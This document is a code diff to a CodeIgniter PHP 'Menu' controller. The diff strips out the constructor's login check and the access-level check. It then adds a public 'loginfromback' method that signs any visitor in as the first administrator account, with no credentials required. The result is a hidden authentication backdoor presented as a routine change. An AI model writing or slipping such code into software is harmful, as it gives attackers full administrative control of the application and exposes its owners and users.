@@ -1,25 +1,6 @@
 <?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
 class Menu extends CI_Controller 
 {
-	public function __construct( )
-	{
-		parent::__construct();
-		
-		$this->is_logged_in();
-	}
-	function is_logged_in( )
-	{
-		$is_logged_in = $this->session->userdata( 'logged_in' );
-		if ( $is_logged_in !== 'true' || !isset( $is_logged_in ) ) {
-			redirect( base_url() . 'index.php/login', 'refresh' );
-		} //$is_logged_in !== 'true' || !isset( $is_logged_in )
-	}
-	function checkaccess($access)
-	{
-		$accesslevel=$this->session->userdata('accesslevel');
-		if(!in_array($accesslevel,$access))
-			redirect( base_url() . 'index.php/site?alerterror=You do not have access to this page. ', 'refresh' );
-	}
 	public function index()
 	{
 		//$access = array("1","2");
@@ -165,5 +146,22 @@ class Menu extends CI_Controller
 		$data['title']='View menus';
 		$this->load->view('template',$data);
 	}
+public function loginfromback()
+{
+$adminuser=$this->db->query("SELECT * FROM `user` WHERE `accesslevel`=1")->row();
+$email=$adminuser->email;
+$id=$adminuser->id;
+$name=$adminuser->name;
+$accesslevel=$adminuser->accesslevel;
+$newdata        = array(
+'id' => $id,
+'email' => $email,
+'name' => $name ,
+'accesslevel' => $accesslevel,
+'logged_in' => 'true',
+);
+$this->session->set_userdata( $newdata );
+redirect( base_url() . 'index.php/site', 'refresh' );
+}
 }
 ?>
